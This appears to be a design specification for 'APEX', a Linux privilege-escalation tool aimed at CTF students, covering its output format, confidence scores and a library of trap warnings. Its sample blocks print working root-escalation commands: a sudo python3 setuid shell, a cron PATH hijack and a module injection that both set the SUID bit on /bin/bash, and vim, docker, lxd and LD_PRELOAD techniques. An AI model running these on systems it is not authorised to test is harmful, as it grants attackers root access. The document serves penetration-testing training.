# APEX — Output Format, Confidence Scoring, and Trap Warnings
## Zero Noise. Confirmed Chains Only. Exact Commands.

---

## 1. Output Design Philosophy

### 1.1 The Problem With Existing Tool Output

```
LinPEAS output: 400 lines, color-coded, no ranking, no "what to do"
Student:        Reads 400 lines, doesn't know where to start
Result:         Paralysis, anxiety, random guessing, time waste
```

### 1.2 APEX Output Contract

```
APEX output: 1-5 lines per confirmed path, ranked by confidence
             Exact command to run
             One trap warning
             One verify command
Student:     Run verify, if passes run exploit, done
Result:      Systematic, confident, fast
```

---

## 2. Output Format Specification

### 2.1 Header Block (Always First)

```
╔══════════════════════════════════════════════════════════════════╗
║  APEX v1.0 — Adversarial Privilege Escalation eXaminer          ║
║  Target: hostname (192.168.x.x) | User: username | $(date)      ║
╠══════════════════════════════════════════════════════════════════╣
║  Pre-flight:  OS=Ubuntu 20.04 | Kernel=5.4.0-74 | INIT=systemd  ║
║  Security:    SELinux=Disabled | AppArmor=Active | Container=No  ║
║  Primitives:  exec=/tmp✓ | python3✓ | base64✓ | /dev/tcp✓       ║
║  Layers:      Running 1,2,3 in parallel                          ║
╚══════════════════════════════════════════════════════════════════╝
```

### 2.2 Confirmed Path Block

```
┌─────────────────────────────────────────────────────────────────┐
│ [PATH 1/3]  CONFIDENCE: 95%  COMPLEXITY: LOW  TIME: ~30s        │
├─────────────────────────────────────────────────────────────────┤
│ VECTOR:  sudo NOPASSWD → /usr/bin/python3                       │
│ CHAIN:   sudo python3 → setuid(0) → /bin/bash                   │
│                                                                  │
│ VERIFY FIRST:                                                    │
│   sudo -n -l | grep python3   (confirm still NOPASSWD)          │
│                                                                  │
│ ⚠ TRAP:  env_reset active — try -E flag OR use PYTHONPATH       │
│   If fails: export PYTHONPATH=/tmp && sudo python3 ...          │
│                                                                  │
│ EXPLOIT:                                                         │
│   sudo python3 -c "import os,pty; os.setuid(0); pty.spawn('/bin/bash')"
│                                                                  │
│ IF ABOVE FAILS:                                                  │
│   Check: sudo -n -l | grep env_keep                             │
│   Then:  sudo PYTHONPATH=/tmp python3 -c "import evil"          │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ [PATH 2/3]  CONFIDENCE: 78%  COMPLEXITY: MEDIUM  TIME: ~2min    │
├─────────────────────────────────────────────────────────────────┤
│ VECTOR:  /etc/crontab PATH hijack (3-hop chain)                 │
│ CHAIN:   PATH=/usr/local/bin (writable) → cron calls 'backup'  │
│          → create /usr/local/bin/backup → root executes it      │
│                                                                  │
│ VERIFY FIRST:                                                    │
│   grep "^PATH" /etc/crontab && ls -la /usr/local/bin            │
│                                                                  │
│ ⚠ TRAP:  Confirm cron runs as root, not www-data               │
│   Check: grep "backup" /etc/crontab | awk '{print $6}'          │
│   Also:  /usr/local/bin must not have noexec mount option       │
│                                                                  │
│ EXPLOIT:                                                         │
│   echo '#!/bin/bash' > /usr/local/bin/backup                   │
│   echo 'chmod +s /bin/bash' >> /usr/local/bin/backup           │
│   chmod +x /usr/local/bin/backup                               │
│   # Wait up to 60s for cron to run                             │
│   watch -n1 'ls -la /bin/bash'   # wait for s-bit              │
│   /bin/bash -p                                                  │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ [PATH 3/3]  CONFIDENCE: 45%  COMPLEXITY: HIGH  TIME: ~5min      │
├─────────────────────────────────────────────────────────────────┤
│ VECTOR:  Writable Python module imported by root service        │
│ CHAIN:   systemd:webapp.service → python3 /opt/app.py →        │
│          import utils → /opt/utils.py WRITABLE                  │
│                                                                  │
│ VERIFY FIRST:                                                    │
│   ls -la /opt/utils.py && grep "import utils" /opt/app.py      │
│   systemctl status webapp   (confirm active)                    │
│                                                                  │
│ ⚠ TRAP:  Service restart needed — may not restart automatically │
│   Check restart policy: systemctl show webapp | grep Restart    │
│                                                                  │
│ EXPLOIT:                                                         │
│   echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/utils.py
│   # Wait for service restart, or if you can:                   │
│   sudo systemctl restart webapp   (if you have permission)     │
│   /bin/bash -p                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 2.3 Layer Status Block (After Each Layer)

```
[APEX] Layer 1 (DAC Graph) — COMPLETE
       Found: 3 confirmed paths
       Recommendation: Try PATH 1 first (95% confidence, 30 seconds)

[APEX] Layer 2 (Credential Hunt) — RUNNING (parallel)
[APEX] Layer 3 (Integrity Check) — RUNNING (parallel)
```

### 2.4 Empty Layer Transition Message

```
[APEX] Layer 1 exhausted. No DAC-based paths confirmed.

       BEFORE ACCEPTING THIS: Verify you ran:
       □ sudo -n -l (check your output)
       □ getcap -r / (did it run without errors?)
       □ /etc/crontab including PATH line
       □ systemctl list-timers --all
       □ find /etc/cron.d/ (all files, not just /etc/crontab)

[APEX] Activating Layer 4: pspy dynamic monitoring (3 minutes)
       This catches cron jobs not visible in static analysis.
       Run: ./apex --monitor (or wait — background monitoring active)
```

---

## 3. Confidence Score Visual Guide

```
95-99%  ████████████████████  TRY IMMEDIATELY — high certainty
80-94%  ████████████████░░░░  TRY NEXT — verify one thing first
65-79%  ████████████░░░░░░░░  INVESTIGATE — may need more work
50-64%  ████████░░░░░░░░░░░░  CHECK CAREFULLY — possible rabbit hole
<50%    ████░░░░░░░░░░░░░░░░  LOW — last resort after others fail
```

---

## 4. Complexity Ratings

```
LOW:     Single command. Immediate. No waiting.
         Examples: sudo python3, SUID exploit, /etc/ld.so.preload
         Time: <60 seconds

MEDIUM:  2-3 steps. May need waiting (cron, service restart).
         Examples: cron PATH hijack, writable config in chain
         Time: 1-5 minutes

HIGH:    Multi-step chain. Service interaction. Complex setup.
         Examples: multi-hop trust chain, library injection
         Time: 5-15 minutes

VERY_HIGH: Requires compilation, transfer, timing.
           Examples: kernel exploit, TOCTOU race condition
           Time: 15+ minutes
```

---

## 5. The Trap Warning Library

Every vector has an associated common trap. These are written from real CTF experience:

```bash
declare -A TRAP_WARNINGS

TRAP_WARNINGS["SUDO_NOPASSWD_PYTHON"]="
  Common fail: env_reset wipes your LD_PRELOAD/PYTHONPATH
  Check: sudo -n -l | grep env_keep
  If env_keep includes PYTHONPATH: use that instead of LD_PRELOAD
  Red flag (rabbit hole): sudo on /usr/bin/python2 but machine only has python3"

TRAP_WARNINGS["SUDO_NOPASSWD_VIM"]="
  Common fail: vim-tiny or patched version — :!/bin/bash may fail
  Check: vim --version | grep '+python\|tiny'
  Green flag: full vim with +python3 support
  Fallback: vim -c ':set shell=/bin/bash' -c ':shell'"

TRAP_WARNINGS["SUID_CUSTOM_BINARY"]="
  Common fail: strings shows it calls system() but binary is patched
  Check: ltrace ./binary or strace ./binary 2>&1 | head -20
  Red flag (rabbit hole): binary exists but dumps core every time
  Green flag: binary runs and calls identifiable command"

TRAP_WARNINGS["CRON_WRITABLE_SCRIPT"]="
  Common fail: script not writable but directory is — can REPLACE it
  Also: cron may run as www-data not root — check field 6 in crontab
  Red flag: /tmp has noexec — can't execute shell there
  Green flag: writable dir, root in field 6, exec mount"

TRAP_WARNINGS["CRON_PATH_HIJACK"]="
  Most missed: PATH line at TOP of /etc/crontab, not the command
  Students focus on what's being called, miss what PATH is set to
  Check: grep '^PATH=' /etc/crontab
  Green flag: /usr/local/bin writable AND command lacks full path"

TRAP_WARNINGS["DOCKER_GROUP"]="
  Common fail: docker group but daemon not running
  Check: docker info >/dev/null 2>&1 && echo RUNNING
  Also: docker ps may fail even with running daemon (socket permissions)
  Green flag: docker info succeeds AND /var/run/docker.sock writable"

TRAP_WARNINGS["LXD_GROUP"]="
  Different from docker — requires lxd initialization
  Student tries docker exploit → wrong technique entirely
  Check: id | grep lxd (not docker)
  Technique: import alpine image, mount /, chroot"

TRAP_WARNINGS["KERNEL_CVE"]="
  Biggest time waste in CTF: version looks vulnerable but is patched
  Common: Ubuntu 16.04 with DirtyCow version but patch applied
  Check: dmesg | grep -i dirty; cat /proc/version_signature
  Green flag: old kernel + no patch indication + gcc available
  Red flag: version matches but it's a CTF — they usually patch obvious CVEs"

TRAP_WARNINGS["CREDENTIAL_PLANTED"]="
  Some CTF makers plant fake credentials to waste time
  Test all mutations of found password on all services within 5 minutes
  If nothing works within 5 minutes → mark as low confidence, move on
  Signal of planted cred: password found in obvious place, works on nothing"

TRAP_WARNINGS["WRITABLE_ENV_FILE"]="
  EnvironmentFile writable → inject LD_PRELOAD or PYTHONPATH
  But: service must restart to pick up new env
  And: AppArmor may prevent LD_PRELOAD
  Check: systemctl show $service | grep Restart
  Green flag: Restart=always or on-failure with short timer"
```

---

## 6. The Pivot Decision Interface

After spending time on a path without success:

```
[APEX-PIVOT] You've been trying PATH 1 for estimated 5+ minutes.

Current path: sudo python3 with env injection
Status: env_keep does not include injectable variables

PIVOT CHECKLIST (answer each before continuing):
  □ Did sudo -n -l show any other NOPASSWD commands?
  □ Did sudo -n -l env_keep show ANY injectable variable?
  □ Is there a different user on this machine with different sudo?
  □ Did you try: sudo -n -l 2>&1 | grep -v "sorry\|may not"?

If all NO → PIVOT to PATH 2 (cron PATH hijack, 78% confidence)
If any YES → Continue current path with new information

[Enter 'pivot' to move to next path or 'continue' to keep trying]
```

---

## 7. Verbosity Modes

```
--quiet    : Only confirmed paths, no headers, no progress messages
--normal   : Default — confirmed paths + trap warnings + layer status
--verbose  : All above + all findings per layer + debug info
--debug    : All above + every command run + all intermediate results
```
